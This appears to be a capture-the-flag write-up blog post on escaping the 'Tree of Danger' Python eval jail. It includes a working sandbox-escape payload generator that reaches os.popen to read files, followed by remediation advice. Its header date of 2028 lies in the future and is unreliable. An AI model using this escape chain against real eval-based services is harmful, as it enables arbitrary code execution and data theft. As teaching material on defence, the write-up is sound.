---
layout: post
title: "Tree of Danger"
date: 2028-03-12 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, pyjail, sandbox-escape, python, ast, eval, code-injection]
description: "A Python calculator jail that validates its input with an AST allow-list. A boolean bug in the dictionary check lets a fully-unsafe key/value pair through, and the lone '_' blacklist is beaten with str.format — enough to climb to os and read the flag."
---

## Overview

Tree of Danger is a Medium Misc challenge: a `SafetyCalc` service that `eval`s your input after walking its AST against an allow-list. It falls to two cooperating bugs — a [protection-mechanism failure](https://cwe.mitre.org/data/definitions/693.html) in the dictionary validator and an [incomplete blacklist](https://cwe.mitre.org/data/definitions/184.html) that filters a *character* instead of a *capability* — chaining into full [code injection](https://cwe.mitre.org/data/definitions/95.html) RCE.

## The technique

The jail runs:

```python
eval(ex, {'math': math, '__builtins__': {}, 'getattr': getattr}, {})
```

after `is_safe(ex)` rejects the string if it contains `_`, then walks the AST allowing only `Constant`, `List/Tuple/Set`, `Dict`, `Name` (must literally be `math`), `UnaryOp`, `BinOp`, `Call`, `Attribute` — so even though `getattr` sits in the globals, a bare `getattr` name is rejected.

**Bug 1 — the dict validator fails open.** The dictionary check is:

```python
def is_dict_safe(node):
    for k, v in zip(node.keys, node.values):
        if not is_expression_safe(k) and is_expression_safe(v):
            return False
    return True
```

A pair is only rejected when **key is unsafe AND value is safe**. Make *both* unsafe and the condition is `True and False == False` — the dict is declared safe and its children are never validated. So `{<any unsafe AST>: <any unsafe AST>}` passes and is then just executed as ordinary Python.

**Bug 2 — beating the `_` blacklist.** The filter is a plain substring check, so no dunder can be typed. But `"{:c}".format(95)` renders `chr(95)` = `_` at runtime with no underscore in the source. Concatenating builds any dunder: `"__class__"` becomes `U + U + "class" + U + U` where `U = "{:c}".format(95)`.

## Solution

Only `math` and `getattr` resolve at runtime (builtins are `{}`), so the escape starts from `getattr` plus computed dunder strings and climbs to real builtins. Crucially, `subprocess` isn't imported on the remote, so a `Popen`-subclass search fails — pulling `__builtins__` from *any* Python-defined class's `__init__.__globals__` is the portable route:

```python
# reads the string s and returns a source expr with no literal '_'
def enc(s):
    U = '"{:c}".format(95)'
    out, buf = [], ''
    for ch in s:
        if ch == '_':
            if buf: out.append(repr(buf)); buf = ''
            out.append(U)
        else:
            buf += ch
    if buf: out.append(repr(buf))
    return '(' + '+'.join(out) + ')'

CLS, BASE, SUBS = enc('__class__'), enc('__base__'), enc('__subclasses__')
INIT, GLOB      = enc('__init__'), enc('__globals__')
BI, IMPORT      = enc('__builtins__'), enc('__import__')
NAME            = enc('__name__')

subs   = f"getattr(getattr(getattr((),{CLS}),{BASE}),{SUBS})()"
glist  = (f"[getattr(getattr(c,{INIT}),{GLOB}) for c in {subs} "
          f"if getattr(getattr(getattr(c,{INIT}),{CLS}),{NAME})=='function']")
escape = f"({glist})[0][{BI}][{IMPORT}]('os').popen('cat flag*; ls -la').read()"

# both key and value unsafe -> dict validator passes
payload = "{%s:getattr}" % escape
assert '_' not in payload
```

Send `payload` to the service. `eval` prints its result, so the `popen(...).read()` output — the flag — is exfiltrated in-band inside the printed dictionary key. No reverse connection needed. The live instance returns the flag `HTB{...}` (redacted).

## Why it worked

- The validator trusted a per-pair boolean that fails open when both sides are unsafe — an allow-list with a hole.
- The blacklist filtered the underscore *character*, not the *capability* it was guarding; `str.format`'s `c` type re-materializes that character at runtime.
- `getattr` was needlessly exposed in the eval globals, giving attribute traversal to `object.__subclasses__()` and on to real builtins.

## Fix / defense

- Validate every child unconditionally — require **both** key and value safe: `if not (safe(k) and safe(v)): return False`.
- Don't expose `getattr` (or any capability) in the eval globals; an AST allow-list is meaningless if a powerful callable is reachable.
- Block by capability, not by character: forbid `Attribute`/`Call`/`Subscript` for untrusted math input, or use a real sandbox (`asteval`, a seccomp'd subprocess) instead of `eval`.
